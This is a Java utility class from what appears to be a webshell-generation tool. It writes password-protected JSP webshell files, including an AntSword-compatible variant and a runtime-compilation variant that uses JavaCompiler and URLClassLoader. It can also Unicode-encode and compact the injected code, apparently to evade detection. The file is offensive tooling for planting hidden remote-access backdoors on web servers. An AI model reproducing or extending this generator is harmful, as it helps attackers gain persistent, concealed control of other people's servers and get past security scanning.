package org.sec.util;

import com.github.javaparser.ast.body.MethodDeclaration;
import org.apache.log4j.Logger;

@SuppressWarnings("all")
public class WriteUtil {
    private static final Logger logger = Logger.getLogger(WriteUtil.class);

    public static void writeAnt(String antClassCode, String antCode,
                                String antDecCode, String decCode, String output) {
        try {
            logger.info("write ant sword jsp file");
            String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
            StringBuilder sb = new StringBuilder();
            sb.append("<%!").append(antClassCode).append("%>")
                    .append("<%!").append(antDecCode).append("%>")
                    .append("<%!").append(decCode).append("%>")
                    .append("<%").append(antCode).append("%>");
            FileUtil.writeFile(output, compactCode(sb.toString()));
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }

    public static void writeJavac(MethodDeclaration method, MethodDeclaration decMethod,
                                  String password, boolean useUnicode, String outputFile) {
        String prefix = "<%@ page import=\"java.net.URL\" %>\n" +
                "<%@ page import=\"java.net.URLClassLoader\" %>\n" +
                "<%@ page import=\"java.nio.charset.Charset\" %>\n" +
                "<%@ page import=\"java.nio.file.Files\" %>\n" +
                "<%@ page import=\"java.nio.file.Paths\" %>\n" +
                "<%@ page import=\"java.util.Locale\" %>\n" +
                "<%@ page import=\"javax.tools.DiagnosticCollector\" %>\n" +
                "<%@ page import=\"javax.tools.JavaCompiler\" %>\n" +
                "<%@ page import=\"javax.tools.JavaFileObject\" %>\n" +
                "<%@ page import=\"javax.tools.StandardJavaFileManager\" %>\n" +
                "<%@ page import=\"javax.tools.ToolProvider\" %>\n" +
                "<%@ page import=\"java.util.Random\" %>\n" +
                "<%@ page import=\"java.io.File\" %>";
        try {
            logger.info("write javac jsp file");
            String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
            String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
            String decCode = decMethod.toString();
            if (code != null && decCode != null) {
                String source = code.substring(1, code.length() - 2);
                String newCode = compactCode(source);
                String newDecCode = compactCode(decCode);
                if (useUnicode) {
                    logger.info("use unicode encode");
                    newCode = UnicodeUtil.encodeString(newCode);
                    newDecCode = UnicodeUtil.encodeString(newDecCode);
                    String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
                    FileUtil.writeFile(outputFile, output);
                } else {
                    String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
                    FileUtil.writeFile(outputFile, output);
                }
            }
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }

    public static void write(MethodDeclaration method, MethodDeclaration decMethod,
                             String password, boolean useUnicode, String outputFile) {
        try {
            logger.info("write jsp file");
            String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
            String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";

            String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
            String decCode = decMethod.toString();

            if (code != null && decCode != null) {
                String source = code.substring(1, code.length() - 2);
                String newCode = compactCode(source);
                String newDecCode = compactCode(decCode);

                if (useUnicode) {
                    logger.info("use unicode encode");
                    newCode = UnicodeUtil.encodeString(newCode);
                    newDecCode = UnicodeUtil.encodeString(newDecCode);
                    String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
                    FileUtil.writeFile(outputFile, output);
                } else {
                    String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
                    FileUtil.writeFile(outputFile, output);
                }
            }
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }

    private static String compactCode(String input) {
        String[] codes = input.split(System.getProperty("line.separator"));
        StringBuilder codeBuilder = new StringBuilder();
        for (String c : codes) {
            codeBuilder.append(c.trim());
        }
        return codeBuilder.toString().trim();
    }
}
